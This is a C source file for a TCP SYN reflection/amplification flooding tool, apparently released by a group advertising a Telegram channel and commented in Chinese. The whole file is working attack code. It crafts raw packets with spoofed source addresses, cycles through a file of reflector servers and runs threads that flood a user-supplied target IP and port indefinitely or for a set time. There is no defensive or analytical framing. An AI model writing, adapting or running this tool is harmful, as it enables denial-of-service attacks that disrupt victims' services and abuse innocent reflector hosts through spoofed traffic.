/*--------------------------------------------------*\
TCP放大攻击
破晓官方频道：https://t.me/ZeroDawnTeam - 2024-07-22
\*--------------------------------------------------*/
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9

// 全局变量，用于随机数生成
static uint32_t Q[4096], c = 362436;

// 定义链表结构体，用于存储反射服务器列表
struct list
{
    struct sockaddr_in data;  // 存储反射服务器地址信息
    struct list *next;        // 指向下一个节点
    struct list *prev;        // 指向前一个节点
};
struct list *head;           // 链表头节点

// 定义线程数据结构体
struct thread_data { 
    int thread_id;             // 线程ID
    struct list *list_node;   // 指向当前使用的反射服务器节点
    struct sockaddr_in sin;    // 目标服务器地址信息
};

// 初始化随机数生成器
void init_rand(uint32_t x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

// 生成随机数
uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

// 计算校验和
unsigned short csum (unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while( count > 1 ) { 
        sum += *buf++; 
        count -= 2; 
    }
    if(count > 0) { 
        sum += *(unsigned char *)buf; 
    }
    while (sum>>16) { 
        sum = (sum & 0xffff) + (sum >> 16); 
    }
    return (unsigned short)(~sum);
}

// 计算 TCP 校验和
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {

    // 定义TCP伪首部结构体
    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_TCP;
    pseudohead.length=htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);

    // 分配内存存储伪首部和TCP首部
    unsigned short *tcp = malloc(totaltcp_len);
    
    // 拷贝数据到内存
    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
    
    // 计算校验和
    unsigned short output = csum(tcp,totaltcp_len);
    
    // 释放内存
    free(tcp);
    return output;
}

// 设置 IP 首部
void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;              // IP首部长度
    iph->version = 4;           // IP版本
    iph->tos = 0;              // 服务类型
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr); // IP包总长度
    iph->id = htonl(13373);     // 标识符
    iph->frag_off = 0;          // 分片偏移
    iph->ttl = MAXTTL;          // 生存时间
    iph->protocol = IPPROTO_TCP; // 协议类型
    iph->check = 0;             // 校验和，先设置为0
    iph->saddr = inet_addr("192.168.111.111"); // 源IP地址
}

// 设置 TCP 首部
void setup_tcp_header(struct tcphdr *tcph)
{
    tcph->source = htons(5678);  // 源端口
    tcph->seq = rand();           // 序列号
    tcph->ack_seq = 0;           // 确认号
    tcph->res2 = 0;              // 保留字段
    tcph->doff = 5;              // TCP首部长度
    tcph->syn = 1;              // SYN标志位置1
    tcph->window = htonl(65535); // 窗口大小
    tcph->check = 0;             // 校验和，先设置为0
    tcph->urg_ptr = 0;           // 紧急指针
}

// 攻击线程函数
void *flood(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;
    char datagram[MAX_PACKET_SIZE]; // 存储数据包
    struct iphdr *iph = (struct iphdr *)datagram; // IP首部指针
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr); // TCP首部指针
    struct sockaddr_in sin = td->sin;  // 目标服务器地址信息
    struct  list *list_node = td->list_node; // 当前使用的反射服务器节点
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); // 创建原始套接字
    if(s < 0){
        fprintf(stderr, "无法打开原始套接字.\n");
        exit(-1);
    }
    init_rand(time(NULL)); // 初始化随机数生成器
    bzero(datagram, MAX_PACKET_SIZE); // 初始化数据包
    setup_ip_header(iph); // 设置IP首部
    setup_tcp_header(tcph); // 设置TCP首部
    
    // 设置目标端口和地址
    tcph->source = sin.sin_port;
    tcph->dest = list_node->data.sin_port;
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = list_node->data.sin_addr.s_addr;
    
    // 计算IP首部校验和
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
    
    // 设置IP_HDRINCL选项，允许程序 selbst IP首部
    int tmp = 1;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
        fprintf(stderr, "错误: setsockopt() - 无法设置 HDRINCL!\n"); 
        exit(-1);
    }
    register unsigned int pmk = 0;

    // // 在数据部分添加 128 字节的随机数据
    // char *data = (char *)tcph + sizeof(struct tcphdr);
    // for (int i = 0; i < 128; i++) {
    //     data[i] = rand() % 256;
    // }

    // // 重新计算 IP 包总长度
    // iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 128; 

    // // 重新计算 TCP 校验和
    // tcph->check = 0;
    // tcph->check = tcpcsum(iph, tcph);
    
    // 主循环，发送攻击数据包
    while(1){
        if(pmk % 2)
        {
            // 从攻击机发送SYN包到反射服务器
            iph->saddr = sin.sin_addr.s_addr;
            iph->daddr = list_node->data.sin_addr.s_addr;
            iph->id = htonl(rand_cmwc() & 0xFFFFFF);
            iph->check = csum ((unsigned short *) datagram, iph->tot_len);
            tcph->dest = list_node->data.sin_port;
            tcph->seq = rand_cmwc() & 0xFFFF;
            tcph->check = 0;
            tcph->check = tcpcsum(iph, tcph);
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
            // 移动到下一个反射服务器节点
            list_node = list_node->next;
        } else {
            // 从反射服务器发送SYN包到目标服务器 
            iph->saddr = list_node->data.sin_addr.s_addr;;
            iph->daddr = sin.sin_addr.s_addr;
            iph->id = htonl(rand_cmwc() & 0xFFFFFF);
            iph->check = csum ((unsigned short *) datagram, iph->tot_len);
            tcph->seq = rand_cmwc() & 0xFFFF;
            tcph->source = list_node->data.sin_port;
            tcph->dest = sin.sin_port;
            tcph->check = 0;
            tcph->check = tcpcsum(iph, tcph);
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
        }
        pmk++;
        usleep(0); // 可选的延迟
    }
}

int main(int argc, char *argv[ ])
{
    // 检查命令行参数
    if(argc < 4){
        printf("\e[33m破晓\e[0m \e[31m官方频道：https://t.me/ZeroDawnTeam\e[0m\n");
        fprintf(stdout, "\e[32m使用方法: %s <目标 IP> <目标端口> <反射服务器列表文件> <线程数> <时间 (可选)>\e[31m\n", argv[0]);
        exit(-1);
    }

    int i = 0;
    head = NULL;
    fprintf(stdout, "正在设置套接字...\n"); 
    
    int max_len = 128;
    char *buffer = (char *) malloc(max_len); // 分配内存用于读取文件
    buffer = memset(buffer, 0x00, max_len); 
    int num_threads = atoi(argv[4]);  // 获取线程数
    
    // 打开反射服务器列表文件
    FILE *list_fd = fopen(argv[3],  "r");
    
    // 读取文件内容并创建链表
    while (fgets(buffer, max_len, list_fd) != NULL) {
        if ((buffer[strlen(buffer) - 1] == '\n') || (buffer[strlen(buffer) - 1] == '\r')) {
            buffer[strlen(buffer) - 1] = 0x00;
            if(head == NULL) // 创建头节点
            {
                head = (struct list *)malloc(sizeof(struct list));
                bzero(head, sizeof(struct list));
                head->data.sin_addr.s_addr=inet_addr(strtok(buffer, " ")); // 设置IP地址
                head->data.sin_port=htons(atoi(strtok(NULL, " "))); // 设置端口号
                head->next = head; // 指向自身
                head->prev = head; 
            } else { // 创建其他节点
                struct list *new_node = (struct list *)malloc(sizeof(struct list));
                bzero(new_node, sizeof(struct list));
                new_node->data.sin_addr.s_addr=inet_addr(strtok(buffer, " "));
                new_node->data.sin_port=htons(atoi(strtok(NULL, " ")));
                new_node->prev = head;  // 新节点的前一个节点是头节点
                new_node->next = head->next; // 新节点的下一个节点是原头节点的下一个节点
                head->next = new_node;  // 头节点的下一个节点是新节点
            }
            i++;
        }
    }
    
    // 创建线程数组
    pthread_t thread[num_threads];
    struct sockaddr_in sin; 
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2])); // 设置目标端口
    sin.sin_addr.s_addr = inet_addr(argv[1]); // 设置目标IP地址

    // 创建线程数据结构体数组
    struct thread_data td[num_threads];

    // 创建线程并启动攻击
    for(i = 0;i<num_threads;i++){
        td[i].thread_id = i;
        td[i].sin= sin;
        td[i].list_node = head;
        pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
        head = head->next; // 移动到下一个反射服务器节点
    }
    fprintf(stdout, "开始攻击...\n"); 

    // 控制攻击时间
    if(argc > 5)
    {
        sleep(atoi(argv[5]));
    } else {
        while(1){
            sleep(1);
        }
    }
    return 0;
}